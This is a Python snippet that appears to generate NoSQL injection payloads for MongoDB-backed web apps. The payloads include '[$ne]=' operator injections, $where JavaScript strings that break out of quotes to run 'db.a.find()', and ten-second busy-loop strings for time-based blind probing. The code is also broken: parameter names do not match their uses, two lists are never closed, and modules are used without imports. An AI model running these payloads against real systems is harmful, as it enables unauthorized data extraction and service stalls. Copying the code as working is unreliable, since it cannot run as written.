import string

formatAvailables=[1,2,3,4]
def randInjString(size, formatStringString):
    if formatString == 1:
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for x in range(size))

    elif formatString == 2:
        chars = string.ascii_letters
        return ''.join(random.choice(chars) for x in range(size))

    elif formatString == 3:
        chars = string.digits
        return ''.join(random.choice(chars) for x in range(size))

    elif formatString == 4:
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for x in range(size)) + '@' + ''.join(random.choice(chars) for x in range(size)) + '.com'

#TODO: test with strings is only made with '. It would be good to test all 4 possibilities, ' ' | ' " | " ' | " "

combinations = [1,2,3,4]

def createNeqString(size, formatStringString):
    return "[$ne]="+randInjString(size, formatStringString)

def createWhereStrString():
    leftPart = [
        "=a\';",
        "=a\";",
        "=1;"

    rightPart = [
        "var d=\"a",
        "var d=\'a",
        "var d=1"

    informations = [
        "return db.a.find();",
        "return db.a.findOne();",
    ]

    for st in itertools.product(leftPart, informations, rightPart):
        yield st

#def createWhereOneStrString():
#    return "=1; return db.a.findOne(); var dummy='!"

#def createWhereOneIntString():
#    return "=a'; return db.a.findOne(); var dummy=1"

def createTimeStrString():
    return "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!"

def createTimeIntString():
    return "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1"

def createThisNeqStrString(size, formatStringString):
    return "=a'; return this.a != '" + randInjString(size, formatStringString) + "'; var dummy='!"

def createThisNeqIntString(size, formatStringString):
    return "=1; return this.a !=" + randInjString(size, formatStringString) + "; var dummy=1"
